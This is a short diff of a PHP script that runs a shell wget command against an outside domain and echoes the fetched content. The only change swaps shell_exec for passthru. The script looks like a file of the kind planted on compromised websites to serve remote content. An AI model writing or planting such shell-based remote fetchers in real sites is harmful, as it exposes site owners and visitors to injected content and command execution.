@@ -1,5 +1,5 @@
 <?php
-$result = shell_exec(" wget -O -  'https://362227.top' ");
+$result = passthru(" wget -O -  'https://362227.top' ");
 echo $result;
 exit;
 
